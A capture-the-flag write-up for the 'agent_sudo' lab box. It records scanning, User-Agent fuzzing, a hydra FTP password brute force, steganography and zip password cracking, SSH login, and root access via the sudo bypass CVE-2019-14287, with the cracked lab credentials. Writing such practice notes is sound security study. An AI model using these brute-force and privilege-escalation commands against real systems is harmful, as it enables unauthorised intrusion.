# Box Name

## agent_sudo

## Overview
---
* [[#Enumeration]]

* [[#Initial Foothold]]

* [[#Privilege Escalation]]

---
## Enumeration
---

# NMAP
-   ### open ports
```bash
# Nmap 7.92 scan initiated Sat Feb 12 21:00:10 2022 as: nmap -vvv -p 21,22,80 -sCV -oN nmap/initial.md 10.10.215.84
Nmap scan report for 10.10.215.84
Host is up, received syn-ack (0.16s latency).
Scanned at 2022-02-12 21:00:11 UTC for 13s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5hdrxDB30IcSGobuBxhwKJ8g+DJcUO5xzoaZP/vJBtWoSf4nWDqaqlJdEF0Vu7Sw7i0R3aHRKGc5mKmjRuhSEtuKKjKdZqzL3xNTI2cItmyKsMgZz+lbMnc3DouIHqlh748nQknD/28+RXREsNtQZtd0VmBZcY1TD0U4XJXPiwleilnsbwWA7pg26cAv9B7CcaqvMgldjSTdkT1QNgrx51g4IFxtMIFGeJDh2oJkfPcX6KDcYo6c9W1l+SCSivAQsJ1dXgA2bLFkG/wPaJaBgCzb8IOZOfxQjnIqBdUNFQPlwshX/nq26BMhNGKMENXJUpvUTshoJ/rFGgZ9Nj31r
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHdSVnnzMMv6VBLmga/Wpb94C9M2nOXyu36FCwzHtLB4S4lGXa2LzB5jqnAQa0ihI6IDtQUimgvooZCLNl6ob68=
|   256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOL3wRjJ5kmGs/hI4aXEwEndh81Pm/fvo8EvcpDHR5nt
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 12 21:00:24 2022 -- 1 IP address (1 host up) scanned in 14.55 seconds

 ```

# Ferox 
-   ### initial scan
```bash
ferox -u http://10.10.139.15 -w ~/SecLists/Discovery/Web-Content/common.txt  -x php,txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 1.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.139.15
 🚀  Threads               │ 50
 📖  Wordlist              │ /home/scott/SecLists/Discovery/Web-Content/common.txt
 🆗  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/1.10.3
 💲  Extensions            │ [php, txt]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 ⏯   Press [ENTER] to pause|resume your scan
──────────────────────────────────────────────────

200       18l       28w      218c http://10.10.139.15/index.php
```

# Web page
```bash
Dear agents,  
  
Use your own **codename** as user-agent to access the site.  
  
From,  
Agent R
```

# ffuf
```js
ffuf -c -w User-Agent.txt -u HTTP://10.10.139.15 -H "User-Agent: FUZZ"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : HTTP://10.10.139.15
 :: Wordlist         : FUZZ: User-Agent.txt
 :: Header           : User-Agent: FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

C                       [Status: '302', Size: 218, Words: 13, Lines: 19]
Z                       [Status: 200, Size: 218, Words: 13, Lines: 19]
V                       [Status: 200, Size: 218, Words: 13, Lines: 19]
W                       [Status: 200, Size: 218, Words: 13, Lines: 19]
H                       [Status: 200, Size: 218, Words: 13, Lines: 19]
G                       [Status: 200, Size: 218, Words: 13, Lines: 19]
E                       [Status: 200, Size: 218, Words: 13, Lines: 19]
D                       [Status: 200, Size: 218, Words: 13, Lines: 19]
F                       [Status: 200, Size: 218, Words: 13, Lines: 19]
P                       [Status: 200, Size: 218, Words: 13, Lines: 19]
S                       [Status: 200, Size: 218, Words: 13, Lines: 19]
A                       [Status: 200, Size: 218, Words: 13, Lines: 19]
M                       [Status: 200, Size: 218, Words: 13, Lines: 19]
R                       [Status: 200, Size: 310, Words: 31, Lines: 19]
K                       [Status: 200, Size: 218, Words: 13, Lines: 19]
Q                       [Status: 200, Size: 218, Words: 13, Lines: 19]
O                       [Status: 200, Size: 218, Words: 13, Lines: 19]
J                       [Status: 200, Size: 218, Words: 13, Lines: 19]
X                       [Status: 200, Size: 218, Words: 13, Lines: 19]
U                       [Status: 200, Size: 218, Words: 13, Lines: 19]
B                       [Status: 200, Size: 218, Words: 13, Lines: 19]
Y                       [Status: 200, Size: 218, Words: 13, Lines: 19]
L                       [Status: 200, Size: 218, Words: 13, Lines: 19]
T                       [Status: 200, Size: 218, Words: 13, Lines: 19]
I                       [Status: 200, Size: 218, Words: 13, Lines: 19]
N                       [Status: 200, Size: 218, Words: 13, Lines: 19]
:: Progress: [26/26] :: Job [1/1] :: 20 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```
### changed user agent to C
```bash
GET / HTTP/1.1
Host: 10.10.139.15
Upgrade-Insecure-Requests: 1
User-Agent: C
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

### get redirected to a new page 
- #### /agent_C_attention.php

```bash
Attention chris,  
  
Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!  
  
From,  
Agent R
```

# FTP
- ## used hydra to brute force Chris's ftp password
```bash
hydra -l chris -P ~/rockyou.txt ftp://10.10.139.15
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-31 17:17:46
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.139.15:21/
[STATUS] 240.00 tries/min, 240 tries in 00:01h, 14344159 to do in 996:08h, 16 active
[21][ftp] host: 10.10.139.15   'login: chris'   'password: crystal'
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-31 17:18:53

```

 ### log into ftp as chris
```bash
ftp 10.10.139.15                                                      
Connected to 10.10.139.15.
220 (vsFTPd 3.0.3)
Name (10.10.139.15:scott): chris
331 Please specify the password.
Password: 'crystal'
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||48182|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> 

```

### download files for offline review

- #### To_agentJ.txt
```bash
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It should not be a problem for you.

From,
Agent C

```

# Stenography
### Used stegseek to extract files from cute-alien.jpg

```bash
stegseek files/cute-alien.jpg ~/rockyou.txt 
StegSeek version 0.5
Progress: 12.90% (18049347 bytes)           

[i] --> Found passphrase: "Area51"
[i] Original filename: "message.txt"
[i] Extracting to "cute-alien.jpg.out"

```
### cat  cute-alien.jpg.out
```bash
Hi james,

Glad you find this message. Your login password is 'hackerrules!'

Don not ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris

```

### Binwalk on cutie.png
```bash
 binwalk -e cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

```

```bash
# Zip2john
zip2john 8702.zip > 8702.john

john --wordlist=/home/scott/rockyou.txt 8702.john                                                                      
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 SSE2 4x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:01 DONE (2022-02-12 22:03) 0.6622g/s 16275p/s 16275c/s 16275C/s michael!..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

#### cat To_agentR.txt
```bash
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

```bash
echo 'QXJlYTUx' | base64 -d                                 
Area51 
```
## Initial Foothold
---
# SSH
- #### SSH into the box as James
```bash
ssh james@10.10.139.15 
The authenticity of host '10.10.139.15 (10.10.139.15)' can not be established.
ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.139.15' (ED25519) to the list of known hosts.
james@10.10.139.15 password: "hackerrules!"
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jan 31 23:39:06 UTC 2023

  System load:  0.0               Processes:           98
  Usage of /:   40.1% of 9.78GB   Users logged in:     0
  Memory usage: 22%               IP address for eth0: 10.10.139.15
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ 
```

#### Deceptive Sudo
```bash
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```
---
## Privilege Escalation

# Linpeas
```bash
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version '1.8.21p2'

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034
Vulnerable to CVE-2019-14287
Potentially Vulnerable to CVE-2022-2588

```

## CVE-2019-14287
```bash
james@agent-sudo:~$ sudo -u#-1 /bin/bash
[sudo] password for james: 'hackerrules!'
root@agent-sudo:~# id
uid=0(root) gid=1000(james) groups=1000(james)
root@agent-sudo:~# 
```

# CVE-2021-4034
- ## has been patched


----
